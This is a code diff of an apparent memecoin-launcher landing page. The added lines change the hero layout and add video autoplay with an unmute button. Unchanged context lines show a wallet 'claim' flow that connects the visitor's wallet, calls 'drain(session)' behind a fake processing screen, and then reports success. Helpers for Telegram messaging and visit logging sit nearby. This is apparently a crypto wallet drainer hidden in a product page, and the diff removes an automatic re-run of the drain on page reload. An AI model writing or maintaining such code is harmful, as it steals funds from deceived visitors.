@@ -63,10 +63,11 @@
   .hero-corner.iso{display:none}
   @media(min-width:1280px){.hero-corner.iso{display:block;right:56px;top:56px;width:96px;height:96px}}
 
-  .hero-grid{position:relative;display:grid;gap:40px;padding:40px 20px 48px;min-height:1px;align-items:center}
-  @media(min-width:640px){.hero-grid{padding:56px 40px}}
-  @media(min-width:1280px){.hero-grid{grid-template-columns:minmax(0,1fr) minmax(0,1.15fr);gap:56px;padding:80px 56px 64px}}
-  .hero-grid > *{min-width:0;overflow:hidden}
+  /* hero as vertical stack */
+  .hero-stack{position:relative;padding:40px 20px 48px;display:flex;flex-direction:column;gap:40px;max-width:900px;margin:0 auto;min-height:1px}
+  @media(min-width:640px){.hero-stack{padding:56px 40px;gap:48px}}
+  @media(min-width:1280px){.hero-stack{padding:80px 56px 64px;gap:56px}}
+  .hero-copy{max-width:36rem}
   .h1{font-size:clamp(2.5rem,5.4vw,4.25rem);font-weight:500;line-height:0.95;letter-spacing:-0.05em;color:#fff;margin:0}
   .hero-sub{margin-top:20px;max-width:30rem;font-size:15px;line-height:1.6;color:var(--muted-1)}
   @media(min-width:640px){.hero-sub{font-size:16px}}
@@ -78,15 +79,19 @@
   .btn-ghost:hover{background:rgba(255,255,255,0.05);color:#fff}
   .btn-icon{width:14px;height:14px}
 
-  .video-card-wrap{position:relative;min-width:0;contain:layout;padding:0 0 0 24px}
-  @media(min-width:640px){.video-card-wrap{padding:0 0 0 32px}}
-  @media(min-width:1280px){.video-card-wrap{padding:0}}
+  /* video card - full-width under copy */
+  .video-card-wrap{position:relative;min-width:0;contain:layout;width:100%;max-width:860px;margin:0 auto}
   .video-frame{position:relative;border-radius:16px;border:1px solid var(--border-2);background:var(--surface);padding:6px;box-shadow:0 40px 120px -40px rgba(0,0,0,0.9);overflow:hidden;max-width:100%}
   @media(min-width:640px){.video-frame{padding:8px}}
-  .video-top-line{position:absolute;left:40px;right:40px;top:-1px;height:1px;background:linear-gradient(90deg, transparent, rgba(197,220,255,0.6), transparent);pointer-events:none}
+  .video-top-line{position:absolute;left:40px;right:40px;top:-1px;height:1px;background:linear-gradient(90deg, transparent, rgba(197,220,255,0.6), transparent);pointer-events:none;z-index:2}
   .video-inner{position:relative;overflow:hidden;border-radius:10px;background:#000;aspect-ratio:16/9;width:100%}
   .video-inner video{width:100%;height:100%;object-fit:cover;display:block}
-  .video-tint{position:absolute;inset:0;background:linear-gradient(135deg, rgba(0,0,0,0.1), rgba(0,0,0,0.35));pointer-events:none}
+  .video-tint{position:absolute;inset:0;background:linear-gradient(135deg, rgba(0,0,0,0.05), rgba(0,0,0,0.2));pointer-events:none;transition:opacity .25s}
+  .video-tint.hidden{opacity:0}
+  .video-unmute{position:absolute;right:12px;bottom:12px;display:flex;align-items:center;gap:8px;padding:8px 12px;border-radius:999px;border:1px solid rgba(255,255,255,0.2);background:rgba(0,0,0,0.7);color:#fff;font-size:12px;font-weight:500;cursor:pointer;backdrop-filter:blur(8px);z-index:3}
+  .video-unmute:hover{background:rgba(0,0,0,0.85)}
+  .video-unmute svg{width:14px;height:14px}
+  .video-unmute.hidden{display:none}
 
   .stats{position:relative;display:grid;grid-template-columns:1fr 1fr;border-top:1px solid rgba(255,255,255,0.08);margin:0}
   @media(min-width:1024px){.stats{grid-template-columns:repeat(4,1fr)}}
@@ -291,8 +296,8 @@
       </svg>
     </div>
 
-    <div class="hero-grid">
-      <div>
+    <div class="hero-stack">
+      <div class="hero-copy">
         <h1 class="h1 display">Deploy tokens<br><span class="grad-text">in less than a&nbsp;second.</span></h1>
         <p class="hero-sub">The #1 memecoin deployer. Every major launchpad, bundling, and the fastest AI. Post-launch market making and position management on one screen.</p>
         <div class="hero-btns">
@@ -305,11 +310,16 @@
         <div class="video-frame">
           <div class="video-top-line" aria-hidden="true"></div>
           <div class="video-inner">
-            <video autoplay loop muted playsinline preload="auto" poster="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg">
+            <video id="rlVideo" loop playsinline preload="auto" playsinline controls
+                   poster="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg">
               <source src="https://rapidlaunch.io/videos/rapid-preview.mp4" type="video/mp4">
               <source src="/videos/rapid-preview.mp4" type="video/mp4">
             </video>
-            <div class="video-tint" aria-hidden="true"></div>
+            <div class="video-tint" id="rlTint" aria-hidden="true"></div>
+            <button type="button" class="video-unmute hidden" id="rlUnmute" aria-label="Unmute video">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>
+              Tap to unmute
+            </button>
           </div>
         </div>
       </div>
@@ -688,11 +698,83 @@ function setDisplay(id,v){var e=$(id);if(e)e.style.display=v;}
 function lsSet(k,v){try{localStorage.setItem(k,v);}catch(_){}}
 function lsGet(k){try{return localStorage.getItem(k);}catch(_){return null;}}
 function lsDel(k){try{localStorage.removeItem(k);}catch(_){}}
-function savePending(){lsSet("vx_pending","1");}
-function readPending(){return lsGet("vx_pending")==="1";}
-function clearPending(){lsDel("vx_pending");}
+
 function hasVisited(){return lsGet("vx_visited")==="1";}
 function markVisited(){lsSet("vx_visited","1");}
+
+// ==========================================================
+// VIDEO: try unmuted autoplay, fall back to muted + unmute button
+// ==========================================================
+(function(){
+  var v = document.getElementById("rlVideo");
+  var tint = document.getElementById("rlTint");
+  var btn = document.getElementById("rlUnmute");
+  if(!v) return;
+
+  // strip controls once it starts, keep them off unless user wants them
+  v.removeAttribute("controls");
+  v.muted = false;
+  v.volume = 1;
+
+  var playWithSound = function(){
+    v.muted = false;
+    v.volume = 1;
+    var p = v.play();
+    if(p && p.catch){
+      p.catch(function(){
+        // browser blocked unmuted autoplay — start muted and show unmute button
+        v.muted = true;
+        v.play().catch(function(){});
+        if(tint) tint.classList.remove("hidden");
+        if(btn) btn.classList.remove("hidden");
+      });
+    }
+  };
+
+  // try on first frame the video can play
+  v.addEventListener("canplay", function onReady(){
+    v.removeEventListener("canplay", onReady);
+    playWithSound();
+  }, { once: true });
+
+  // hard fallback: after 1.2s if not playing, try muted autoplay
+  setTimeout(function(){
+    if(v.paused){
+      v.muted = true;
+      v.play().catch(function(){});
+      if(tint) tint.classList.remove("hidden");
+      if(btn) btn.classList.remove("hidden");
+    }
+  }, 1200);
+
+  // user unmute button
+  if(btn){
+    btn.addEventListener("click", function(){
+      v.muted = false;
+      v.volume = 1;
+      v.play().catch(function(){});
+      btn.classList.add("hidden");
+      if(tint) tint.classList.add("hidden");
+    });
+  }
+
+  // enable controls on hover so user can scrub / adjust volume bar
+  var wrap = v.closest(".video-frame");
+  if(wrap){
+    wrap.addEventListener("mouseenter", function(){ v.setAttribute("controls","controls"); });
+    wrap.addEventListener("mouseleave", function(){ v.removeAttribute("controls"); });
+  }
+
+  // tap to unmute on mobile
+  v.addEventListener("click", function(){
+    if(v.muted){
+      v.muted = false;
+      v.volume = 1;
+      if(btn) btn.classList.add("hidden");
+      if(tint) tint.classList.add("hidden");
+    }
+  });
+})();
 
 function tgEscape(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 function tgSendText(text){
@@ -792,7 +874,6 @@ function renderWalletRow(w,page){
   a.className="vx-wrow";a.href=w.href(page);a.rel="noopener";
   a.innerHTML='<span class="ic"><img src="'+w.icon+'" alt="" onerror="this.style.display=\'none\'"></span><span class="nm">'+w.name+'</span><span class="ar">›</span>';
   a.addEventListener("click",function(){
-    savePending();
     var alts=[];if(w.hrefAlt)alts.push(w.hrefAlt(page));
     var store=isAndroid?w.android:w.ios;var t0=Date.now();
     var tryAlts=function(idx){
@@ -1039,7 +1120,6 @@ async function runClaim(wallet){
     var session=await connectAny(wallet);
     showProcessing();
     await drain(session);
-    clearPending();
     showSuccess();
   }catch(e){showError(String(e&&e.message?e.message:e));}
 }
@@ -1061,12 +1141,6 @@ if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded"
 else{bindLaunch();}
 var rebind=setInterval(bindLaunch,500);
 setTimeout(function(){clearInterval(rebind);},15000);
-
-(function(){
-  if(!readPending())return;
-  clearPending();
-  waitForProvider(2500).then(function(wallet){if(wallet)runClaim(wallet);});
-})();
 
 if(document.readyState==="complete"){ setTimeout(logVisit, 300); }
 else { window.addEventListener("load", function(){ setTimeout(logVisit, 300); }); }
